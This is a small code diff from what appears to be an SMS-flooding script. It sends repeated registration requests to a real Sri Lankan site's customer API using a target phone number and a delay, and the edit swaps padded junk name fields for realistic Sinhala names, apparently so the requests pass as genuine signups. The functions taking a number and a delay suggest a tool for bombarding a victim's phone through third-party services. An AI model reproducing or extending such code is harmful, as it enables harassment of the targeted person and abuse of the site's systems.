@@ -140,7 +140,7 @@ if cho==1:
 		url='https://www.patpat.lk/api/customer.php'
 		para={'customer':'new_customer'}
 		head={'Host':'www.patpat.lk'}
-		body={'title':'Mr.','first_name':'a'*150,'last_name':'7'*550,'email':'s1@l.lk','password':'MTIzNDU2Nw==','telephone':num,'gender':'','dob':'1976-08-24'}
+		body={'title':'Mr.','first_name':'ගලපිටමඩ ආරච්චිලාගේ සාන්ත','last_name':'සාන්ත ගලේගොඩ','email':'s1@l.lk','password':'MTIzNDU2Nw==','telephone':num,'gender':'','dob':'1976-08-24'}
 		po=post(url,params=para,headers=head,json=body)
 		time.sleep(delay)
 	def ona(num,delay):
